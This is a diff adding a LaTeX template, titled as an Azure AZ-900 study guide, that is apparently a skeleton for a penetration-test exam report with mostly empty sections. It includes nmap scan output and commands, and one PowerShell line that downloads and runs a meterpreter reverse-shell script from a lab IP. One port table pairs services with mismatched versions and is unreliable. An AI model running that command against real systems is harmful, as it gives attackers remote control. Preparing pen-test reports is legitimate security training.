@@ -1,0 +1,228 @@
+\documentclass[11pt, a4paper]{article}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{fancyhdr}
+\lstset{
+  basicstyle=\ttfamily,
+  columns=fullflexible,
+  breaklines=true,
+  postbreak=\raisebox{0ex}[0ex][0ex]{\color{red}$\hookrightarrow$\space}
+}
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue,
+    filecolor=magenta,      
+    urlcolor=blue
+}
+\graphicspath{{./}}
+
+\begin{document}
+
+\pagestyle{fancy}
+
+\title{
+    \begin{figure}[h]
+        \centering
+        \includegraphics[scale=0.4]{./pics/}
+        %\caption{}
+        %\label{fig: }
+    \end{figure}    
+Azure AZ-900 Study guide}
+\author{Name \\ email: \href{mailto:}{} \\ \textbf{ID: }}
+\date{../../2025}
+\renewcommand*\contentsname{Table of Contents}
+\maketitle
+
+\renewcommand*\abstractname{Copyright}
+
+\begin{abstract}
+Copyright © 2025 All rights reserved.
+No part of this publication, in whole or in part, may be reproduced, copied, transferred or any other right reserved to its copyright owner, including photocopying and all other copying, any transfer or transmission using any network or other means of communication, any broadcast for distant learning, in any form or by any means such as any information storage, transmission or retrieval system, without prior written permission from author.
+\end{abstract}
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[scale=0.17]{./pics/}
+    %\caption{}
+    %\label{fig: }
+\end{figure}
+
+\newpage
+
+\tableofcontents
+
+\newpage
+% Set the page style to "fancy"...
+
+%... then configure it.
+\fancyhead{} % clear all header fields
+\fancyfoot{} % clear all footer fields
+\fancyhead[C]{\textbf{Azure Fundamentals AZ-900}}
+\fancyfoot[R]{\thepage}
+\fancyfoot[L]{\includegraphics[scale=0.17]{./pics/}}
+
+
+\section{Pen Test Report}
+
+\subsection{Introduction}
+
+
+EXAM BEGIN HERE
+
+
+\begin{lstlisting}[frame=single]
+    # Comment
+    powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/meterpreter_shellcode_reverse.ps1')"
+\end{lstlisting}
+
+Link to \href{https://www.exploit-db.com/}{Exploit} code
+
+
+%\begin{figure}[h]
+%    \centering
+%    \includegraphics[scale=0.39]{}
+%    \caption{Flag Host 1 - IP2}
+%    \label{fig: }
+%\end{figure}
+
+\begin{verbatim}
+PORT      STATE SERVICE      VERSION
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos 
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP 
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+\end{verbatim}
+
+\newpage
+
+Open ports and relative Services/Banner for \textbf{10.10.0.14}:
+
+\begin{center}
+    \begin{tabular}{||c c c||} 
+     \hline
+     PORT & SERVICE & VERSION\\ [0.5ex] 
+     \hline\hline
+     21/tcp & ftp & Microsoft Windows Kerberos\\ 
+     25/tcp & smtp & Microsoft Windows RPC over HTTP 1.0\\
+     80/tcp  & http & Microsoft Windows RPC over HTTP 1.0\\
+     135/tcp & msrpc & Microsoft Windows RPC over HTTP 1.0\\
+     139/tcp & netbios-ssn & Microsoft Windows netbios-ssn\\
+     443/tcp & https & Microsoft Windows RPC over HTTP 1.0\\
+     445/tcp & microsoft-ds & Microsoft Windows RPC over HTTP 1.0\\
+     1025/tcp & NFS-or-IIS & Microsoft Windows Active Directory LDAP\\
+     1026/tcp & LSA-or-nterm & Microsoft Windows RPC\\
+     5800/tcp & vnc-http & .NET Message Framing\\[1ex]
+     \hline
+    \end{tabular}
+\end{center}
+
+\begin{center}
+    \begin{tabular}{||c c c||} 
+     \hline
+     PORT & STATE & SERVICE\\ [0.5ex] 
+     \hline\hline
+     21/tcp & open & ftp\\ 
+     25/tcp & open & smtp\\
+     80/tcp  & open & http\\
+     135/tcp & open & msrpc\\
+     139/tcp & open & netbios-ssn\\
+     443/tcp & open & https\\
+     445/tcp & open & microsoft-ds\\
+     1025/tcp & open & NFS-or-IIS\\
+     1026/tcp & open & LSA-or-nterm\\
+     1028/tcp & open & unknown\\
+     3372/tcp & open & msdtc\\
+     5800/tcp & open & vnc-http\\
+     5900/tcp & open & vnc\\
+     135/udp & open|filtered & msrpc\\
+     137/udp & open & netbios-ns\\
+     138/udp & open|filtered & netbios-dgm\\
+     161/udp & open & snmp\\
+     445/udp & open|filtered & microsoft-ds\\
+     500/udp & open|filtered & isakmp\\
+     1029/udp & open|filtered & solid-mux\\
+     1434/udp & open|filtered & ms-sql-m\\
+     3456/udp & open|filtered & IISrpc-or-vat\\ [1ex]
+     \hline
+    \end{tabular}
+\end{center}
+
+\begin{center}
+    \begin{tabular}{||c c c c||} 
+     \hline
+     IP ADDRESS & NetBIOS NAME & SERVER USER & MAC Address\\ [0.5ex] 
+     \hline\hline
+    10.11.1.227 & JD & ADMINISTRATOR & 00:50:56:ba:5a:d4\\ [1ex]
+     \hline
+    \end{tabular}
+\end{center}
+
+\begin{itemize}
+    \item \underline{TCP Scan}: \textbf{\color{red}sudo nmap -p- --min-rate 10000 IP -Pn --open -n -oN open-ports.txt}
+    \item \underline{UDP Scan}: \textbf{\color{green}nmap -sU -A -v -iL up-host-list.txt}
+    \item \underline{Optimized BannerGrabbing}: \textbf{nmap -sV -sT -v -iL up-host-list.txt}
+\end{itemize}
+
+\subsection{Objective}
+
+\subsection{Requirements}
+
+\section{High-Level Summary}
+
+\subsection{Reccomendation}
+
+\section{Methodologies}
+
+\subsection{Information Gathering}
+
+\subsubsection{Exam Network}
+
+\subsection{Service Enumeration}
+
+\subsection{Penetration}
+
+\subsection{Manteining Access}
+
+\subsection{House Cleaning}
+
+\section{Target 1}
+
+\subsection{Service Enumeration}
+
+\section{Target 2}
+
+\subsection{Service Enumeration}
+
+\section{Target 3}
+
+\subsection{Service Enumeration}
+
+\section{Active Directory Set}
+
+\subsection{DC - IP}
+
+\subsubsection{Service Enumeration}
+
+\subsection{Host 1 - IP}
+
+\subsubsection{Service Enumeration}
+
+\subsection{Host 2 - IP}
+
+\subsubsection{Service Enumeration}
+
+
+
+
+\end{document}
